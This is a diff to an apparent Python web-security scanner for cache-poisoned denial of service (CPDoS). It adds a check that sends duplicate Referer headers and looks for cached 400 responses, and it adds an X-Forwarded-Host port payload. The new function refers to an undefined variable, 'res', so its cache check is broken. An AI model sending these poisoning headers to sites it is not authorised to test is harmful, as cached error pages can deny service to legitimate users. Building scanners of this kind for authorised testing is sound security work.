@@ -54,6 +54,21 @@ def HMO(url, s, main_status_code):
                 print("   └── \033[31m CPDos HMO on {} seem work with {} payload header ! \033[0m".format(url, headers))
 
 
+def RefDos(url, s):
+    headers = {
+    "Referer": "xy",
+    "Referer": "x"
+    }
+    req_ref = s.get(url, headers=headers, verify=False, timeout=10)
+    if req_ref.status_code == 400:
+        print("   └── \033[31m{}  with header {} response 400\033[0m".format(url, headers))
+        for rf in req_ref.headers:
+            if "cache" in rf.lower():
+                if "hit" in res.headers[rf].lower():
+                    print("   └── \033[31m Request to be cached, DOS seem possible !\033[0m".format(url, headers))
+
+
+
 def check_CPDoS(url, s, req_main, domain):
     i = 0
     redirect_req = False
@@ -71,7 +86,7 @@ def check_CPDoS(url, s, req_main, domain):
     main_status_code = req_main.status_code
     
     print("\033[36m --├ {} [{}] \033[0m".format(url, main_status_code))
-    headers = [{"Host":"{}:1234".format(domain)}, {"X-Forwarded-Port":"123"}, {"X-Forwarded-Host": "XXX"}]
+    headers = [{"Host":"{}:1234".format(domain)}, {"X-Forwarded-Port":"123"}, {"X-Forwarded-Host": "XXX"}, {"X-Forwarded-Host": "{}:1234".format(domain)}]
     for h in headers:
         try:
             req_cpdos = s.get(url, headers=h, verify=False, allow_redirects=False, timeout=10)
@@ -122,3 +137,4 @@ def check_CPDoS(url, s, req_main, domain):
     HHO(url, s, main_status_code)
     HMC(url, s, main_status_code)
     HMO(url, s, main_status_code)
+    RefDos(url, s)
